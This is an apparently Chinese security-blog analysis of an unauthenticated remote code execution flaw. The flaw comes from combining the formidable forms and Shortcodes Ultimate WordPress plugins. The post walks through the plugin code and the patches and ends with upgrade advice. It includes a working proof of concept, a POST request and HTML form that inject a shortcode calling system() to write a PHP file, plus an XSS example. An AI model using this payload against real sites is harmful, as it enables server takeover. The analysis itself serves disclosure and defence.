> 原文链接: https://www.anquanke.com//post/id/88067 


# WordPress组合插件远程代码执行漏洞分析


                                阅读量   
                                **133069**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p5.ssl.qhimg.com/t01fdaaa31d34bdbd8a.png)](https://p5.ssl.qhimg.com/t01fdaaa31d34bdbd8a.png)

作者：[蔡思阳@360天眼实验室](http://bobao.360.cn/member/contribute?uid=2794533901)

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



## 0x00 漏洞概述

在前段时间，WordPress修复了两个插件的漏洞–Shortcodes Ultimate和formidable forms，其中Shortcodes Ultimate的下载量在70W+，而formidable forms的下载量在20W+,影响的范围比较广泛。

[![](https://p1.ssl.qhimg.com/t01c19eeb097e8aa0f0.png)](https://p1.ssl.qhimg.com/t01c19eeb097e8aa0f0.png)

[![](https://p2.ssl.qhimg.com/t0169c9f4fcf3e01cac.png)](https://p2.ssl.qhimg.com/t0169c9f4fcf3e01cac.png)

这个漏洞主要是由formidable forms引起的，该插件无需任何权限便可预览表单，然而对上传的html代码没有做任何检验，所以导致了包括xss和shortcode执行等在内的一系列问题。而Shortcodes Ultimate可以自定义shortcode，两者结合就可以造成严重的远程代码执行漏洞，而且无需任何权限。



## 0x01 漏洞分析

利用条件：

插件:**Shortcodes Ultimate&lt;=5.0.0**

插件:**formidable forms &lt;= 2.0.5.1**

我们的分析思路从文后附录的POC开始。

```
POST /wp-admin/admin-ajax.php HTTP/1.1

action=frm_forms_preview&amp;form=`{`‘asdf-asdf’`}`&amp;before_html=[su_meta key=1 post_id=1 default= [su_meta key=1 post_id=1 default='echo 1 &gt; wp_rce.txt' filter='system']&amp;custom_style=1
```

action=frm_forms_preview

tips：

WordPress插件的执行流程：

申明一个add_action，将tag绑定一个函数，类似于route

然后通过do_action或者ajax来调用

所以从action=frm_forms_preview来入手，搜索frm_forms_preview

在FrmHooksController.php中的load_ajax_hooks函数

```
add_action( 'wp_ajax_frm_forms_preview', 'FrmFormsController::preview' );
add_action( 'wp_ajax_nopriv_frm_forms_preview', 'FrmFormsController::preview' );
```

可以看出，frm_forms_preview动作绑定在preview函数上

```
public static function preview() `{`

do_action( 'frm_wp' );



global $frm_vars;

$frm_vars['preview'] = true;



if ( ! defined( 'ABSPATH' ) &amp;&amp; ! defined( 'XMLRPC_REQUEST' ) ) `{`

global $wp;

$root = dirname( dirname( dirname( dirname( __FILE__ ) ) ) );

include_once( $root . '/wp-config.php' );

$wp-&gt;init();

$wp-&gt;register_globals();

`}`



header( 'Content-Type: text/html; charset=' . get_option( 'blog_charset' ) );



$key = FrmAppHelper::simple_get( 'form', 'sanitize_title' );

if ( $key == '' ) `{`

$key = FrmAppHelper::get_post_param( 'form', '', 'sanitize_title' );

`}`



$form = FrmForm::getAll( array( 'form_key' =&gt; $key ), '', 1 );

if ( empty( $form ) ) `{`

$form = FrmForm::getAll( array(), '', 1 );

`}`



require( FrmAppHelper::plugin_path() . '/classes/views/frm-entries/direct.php' );

wp_die();

`}`
```

preview调用direct.php，而direct.php调用show_form函数来展示页面

```
public static function show_form( $id = '', $key = '', $title = false, $description = false, $atts = array() ) `{`

…

…

if ( self::is_viewable_draft_form( $form ) ) `{`

// don't show a draft form on a page

$form = __( 'Please select a valid form', 'formidable' );

`}` else if ( self::user_should_login( $form ) ) `{`

$form = do_shortcode( $frm_settings-&gt;login_msg );

`}` else if ( self::user_has_permission_to_view( $form ) ) `{`

$form = do_shortcode( $frm_settings-&gt;login_msg );

`}` else `{`

$form = self::get_form( $form, $title, $description, $atts );



/**

* Use this shortcode to check for external shortcodes that may span

* across multiple fields in the customizable HTML

* @since 2.0.8

*/

$form = apply_filters( 'frm_filter_final_form', $form );

`}`



return $form;

`}`
```

此时的frm_settings

[![](https://p2.ssl.qhimg.com/t016ee25ac8ae1ba89f.png)](https://p2.ssl.qhimg.com/t016ee25ac8ae1ba89f.png)

可以看到login_msg，我们是不需要登录的

所以show_form走的是else流程

```
$form = self::get_form( $form, $title, $description, $atts );

/**

* Use this shortcode to check for external shortcodes that may span

* across multiple fields in the customizable HTML

* @since 2.0.8

*/

$form = apply_filters( 'frm_filter_final_form', $form );
```

调用get_form函数

```
public static function get_form( $form, $title, $description, $atts = array() ) `{`

ob_start();



self::get_form_contents( $form, $title, $description, $atts );

self::enqueue_scripts( FrmForm::get_params( $form ) );



$contents = ob_get_contents();

ob_end_clean();

self::maybe_minimize_form( $atts, $contents );

return $contents;

`}`
```

调用get_from_contents

而get_form_contents

```
if ( $params['action'] != 'create' || $params['posted_form_id'] != $form-&gt;id || ! $_POST ) `{`

do_action('frm_display_form_action', $params, $fields, $form, $title, $description);

if ( apply_filters('frm_continue_to_new', true, $form-&gt;id, $params['action']) ) `{`

$values = FrmEntriesHelper::setup_new_vars($fields, $form);

include( FrmAppHelper::plugin_path() . '/classes/views/frm-entries/new.php' );

`}`

return;

`}`
```

调用了setup_new_vars函数，

setup_new_vars函数将post请求的内容取出来存放在value数组中

[![](https://p2.ssl.qhimg.com/t014b5c628a9e7b521f.png)](https://p2.ssl.qhimg.com/t014b5c628a9e7b521f.png)

然后调用了new.php,而new.php调用form.php，

form.php调用replace_shortcodes

```
&lt;?php echo FrmFormsHelper::replace_shortcodes( $values['before_html'], $form, $title, $description ); ?&gt;
```

并将before_html的值传入

replace_shortcode函数对$html做一系列过滤，并最终调用

```
if ( apply_filters( 'frm_do_html_shortcodes', true ) ) `{`

$html = do_shortcode( $html );

`}`
```

此时的$html就是before_html的值

do_shortcode函数执行shortcode

我们看看do_shortcode函数

```
* @since 2.5.0

*

* @global array $shortcode_tags List of shortcode tags and their callback hooks.

*

* @param string $content Content to search for shortcodes.

* @param bool $ignore_html When true, shortcodes inside HTML elements will be skipped.

* @return string Content with shortcodes filtered out.

*/

function do_shortcode( $content, $ignore_html = false ) `{`

global $shortcode_tags;

if ( false === strpos( $content, '[' ) ) `{`

return $content;

`}`



if (empty($shortcode_tags) || !is_array($shortcode_tags))

return $content;

...
```

注释上写的很清楚，如果传入的$shortcode_tags存在于全局变量中的话，就会调用相应的hook函数，如果不存在就原样输出。

此时再来看一下我们的payload，

```
before_html=[su_meta key=1 post_id=1 default=''echo 1 &gt; wp_rce.txt' filter='system']

$shortcode_tags=su_meta
```

而Shortcodes Ultimate插件的load.php将su_meta注册了，所以就会调用su_meta对应的函数

在Shortcodes Ultimate插件的inc\core\load.php中会将inc\core\data.php中shortcodes数组里里存在的标签遍历一遍，然后通过add_shortcode注册

```
public static function register() `{`

// Prepare compatibility mode prefix

$prefix = su_cmpt(); // $prefix=su_

// Loop through shortcodes

foreach ( ( array ) Su_Data::shortcodes() as $id =&gt; $data ) `{`

if ( isset( $data['function'] ) &amp;&amp; is_callable( $data['function'] ) ) $func = $data['function'];

elseif ( is_callable( array( 'Su_Shortcodes', $id ) ) ) $func = array( 'Su_Shortcodes', $id );

elseif ( is_callable( array( 'Su_Shortcodes', 'su_' . $id ) ) ) $func = array( 'Su_Shortcodes', 'su_' . $id );

else continue;

// Register shortcode

add_shortcode( $prefix . $id, $func );

`}`

// Register [media] manually // 3.x

add_shortcode( $prefix . 'media', array( 'Su_Shortcodes', 'media' ) );

`}`



`}`
```

而shortcodes数组存在meta标签，所以走的是

```
else if ( is_callable( array( 'Su_Shortcodes', $id ) ) ) $func = array( 'Su_Shortcodes', $id );
```

这个条件

而inc\core\shortcodes.php中存在meta函数，

```
public static function meta( $atts = null, $content = null ) `{`

$atts = shortcode_atts( array(

'key'     =&gt; '',

'default' =&gt; '',

'before'  =&gt; '',

'after'   =&gt; '',

'post_id' =&gt; '',

'filter'  =&gt; ''

), $atts, 'meta' );

// Define current post ID

if ( !$atts['post_id'] ) $atts['post_id'] = get_the_ID();

// Check post ID

if ( !is_numeric( $atts['post_id'] ) || $atts['post_id'] &lt; 1 ) return sprintf( '&lt;p class="su-error"&gt;Meta: %s&lt;/p&gt;', __( 'post ID is incorrect', 'shortcodes-ultimate' ) );

// Check key name

if ( !$atts['key'] ) return sprintf( '&lt;p class="su-error"&gt;Meta: %s&lt;/p&gt;', __( 'please specify meta key name', 'shortcodes-ultimate' ) );

// Get the meta

$meta = get_post_meta( $atts['post_id'], $atts['key'], true );

// Set default value if meta is empty

if ( !$meta ) $meta = $atts['default'];

// Apply cutom filter

if ( $atts['filter'] &amp;&amp; function_exists( $atts['filter'] ) ) $meta = call_user_func( $atts['filter'], $meta );

// Return result

return ( $meta ) ? $atts['before'] . $meta . $atts['after'] : '';
```

而meta函数中最重要的一句就是$meta = call_user_func( $atts[‘filter’], $meta );

会将filter的值作为处理函数，处理meta的内容。而meta来自于default的值

而我们传入的是[su_meta key=1 post_id=1 default=’echo 1 &gt; wp_rce.txt’ filter=’system’]

就利用system函数执行了我们的短代码



## 0x02 漏洞验证

Poc：

```
&lt;html&gt;

&lt;body&gt;

&lt;h2&gt;payload:&lt;/h2&gt;[su_meta key=1 post_id=1 default='echo &amp;#60;?php phpinfo();?&amp;#62; &gt; ../wp-content/wp_rce.php' filter='system']



&lt;form action="http://127.0.0.1/wordpress/wp-admin/admin-ajax.php" method="POST"&gt;

&lt;input type="hidden" name="action" value='frm_forms_preview' /&gt;

&lt;input type="hidden" name="form" value="`{`'contact-form'`}`" /&gt;

&lt;input type="hidden" name="before_html" value="[su_meta key=1 post_id=1 default='echo ^&lt;?php phpinfo();?^&gt; &gt; ../wp-content/wp_rce.php' filter='system']" /&gt;

&lt;input type="hidden" name="custom_style" value="1" /&gt;

&lt;input type="submit" value="Submit" /&gt;

&lt;/form&gt;

&lt;/body&gt;
```

将上述poc保存为html之后，点击submit，访问http://127.0.0.1/wordpress/wp-content/wp_rce.php

[![](https://p1.ssl.qhimg.com/t0147e1b504178ed8e3.png)](https://p1.ssl.qhimg.com/t0147e1b504178ed8e3.png)

同样的原理，如果将payload改为

&lt;script&gt;alert(‘XSS’)&lt;/script&gt;

就会造成xss



## 0x03 补丁分析

formidable forms在新版本中修改了setup_new_vars函数

存在漏洞版本：

```
foreach ( $form-&gt;options as $opt =&gt; $value ) `{`

$values[ $opt ] = FrmAppHelper::get_post_param( $opt, $value );

unset($opt, $value);`}`
```

```
$values = array_merge( $values, $form-&gt;options );
```

可以看出，跳过了get_post_param函数，并没有取出post中的值修复版本：

Shortcodes Ultimate在新版本中添加了对filter函数的检验

存在漏洞版本：

```
'desc' =&gt; __( 'You can apply custom filter to the retrieved value. Enter here function name. Your function must accept one argument and return modified value. Example function: ', 'shortcodes-ultimate' ) . "&lt;br /&gt;&lt;pre&gt;&lt;code style='display:block;padding:5px'&gt;function my_custom_filter( \$value ) `{`\n\treturn 'Value is: ' . \$value;\n`}`&lt;/code&gt;&lt;/pre&gt;"
```

修复版本：

```
'desc' =&gt; __( 'You can apply custom filter to the retrieved value. Enter here function name. Your function must accept one argument and return modified value. Name of your function must include word &lt;b&gt;filter&lt;/b&gt;. Example function: ', 'shortcodes-ultimate' ) . "&lt;br /&gt;&lt;pre&gt;&lt;code style='display:block;padding:5px'&gt;function my_custom_filter( \$value ) `{`\n\treturn 'Value is: ' . \$value;\n`}`&lt;/code&gt;&lt;/pre&gt;"
```

可以看出filter函数必须包含filter字符串



## 0x04 防护建议

如果使用到了这两款插件，请尽快升级：

**formidable forms升级至2.05.07**

**Shortcodes Ultimate升级至5.0.1**



## 0x05 参考文章

[https://www.pluginvulnerabilities.com/2017/11/09/vulnerability-details-shortcode-execution-vulnerability-in-formidable-forms/](https://www.pluginvulnerabilities.com/2017/11/09/vulnerability-details-shortcode-execution-vulnerability-in-formidable-forms/)

任何问题可以联系我silence.darker@gmail.com
